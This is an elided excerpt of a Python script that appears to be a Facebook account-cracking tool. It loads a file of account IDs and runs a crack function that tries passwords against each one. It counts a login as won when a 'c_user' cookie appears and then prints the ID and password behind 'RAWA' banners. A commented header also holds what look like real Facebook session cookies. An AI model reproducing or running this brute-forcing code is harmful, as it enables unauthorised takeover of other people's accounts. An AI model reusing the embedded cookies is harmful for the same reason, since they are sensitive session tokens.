...
headers = {
    ...
    # 'cookie': 'datr=ag3mZbTO225bSyPV3ldikoyZ; sb=ag3mZRL9yxyuJiUP5SAT-Qms; wd=407x904; ps_l=0; ps_n=0; wl_cbv=v2%3Bclient_version%3A2424%3Btimestamp%3A1709575849; vpd=v1%3B725x370x3.2983407974243164; locale=en_US; m_pixel_ratio=3.2983407974243164; dnonce=AWnDGqU2fRl5-mCnTdWdD2jTXKntkzH5pDH8QLudZicTEwB9iMp0Ejx-V0-7PoDPklX2g92esKNFm8-xH4Dr_dWP; fr=0LI9d7s8QXkTKYGbX.AWWteuD4XudURz6PakgVERjHayk.Bl5g1q..AAA.0.0.Bl6MiQ.AWWL6zT8fR0',
    'dpr': '3',
...
class D:
        ...
        def plerr(self):
                ...
                banner()
                try:
                        fileX = input ('\x1b[1;93mNAME FILE🤖  :  \x1b[1;92m')
                        for line in open(fileX, 'r').readlines():
                                id.append(line.strip())
                        print(f'\x1b[1;91mTOTAL ID : \x1b[1;97m'+str(len(id)))
                        Settings()
                except IOError:
...
def crack(idf,pwv):
        ...
        sys.stdout.write(f"\r[RAWA-𝑻𝒆𝒔𝒕🦅]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}"),
        sys.stdout.flush()
...
#                        if "checkpoint" in po.cookies.get_dict().keys():
                        if "c_user" in ses.cookies.get_dict().keys():
                                ...
                                print(f'\r\033[1;32m [🔥💔  ʳαｗ𝓐  ♚🎄] {idf} | {pw} ')
